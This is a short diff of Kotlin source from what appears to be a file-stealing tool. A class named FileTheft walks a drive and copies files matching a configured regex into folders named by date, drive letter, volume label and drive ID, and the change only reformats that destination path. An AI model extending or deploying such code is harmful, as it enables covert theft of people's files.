@@ -31,10 +31,14 @@ class FileTheft(val directory: File) : Theft {
 
     override fun steal() {
         val pattern = Pattern.compile(ConfigParameters.instance.regex, Pattern.CASE_INSENSITIVE).toRegex()
-        val driveMarker = DriveMarker(directory)
+        val driveMarker = DriveMarker.resolve(directory)
         val destDir = File(
                 "${ConfigParameters.instance.dataPath}/" +
-                        "${LocalDate.now()}/${LocalTime.now().toString().validateFileName()}-${directory.absolutePath.first()}-${directory.getVolumeLabel().validateFileName()}-${driveMarker.markID()}"
+                        "${LocalDate.now()}" +
+                        "/${LocalTime.now().toString().replace(':','-').validateFileName()}" +
+                        "-${directory.absolutePath.first()}" +
+                        "-${directory.getVolumeLabel().validateFileName()}" +
+                        "-id${driveMarker.markID()}"
         )
         FileWalker(directory).walk()
                 .stream()
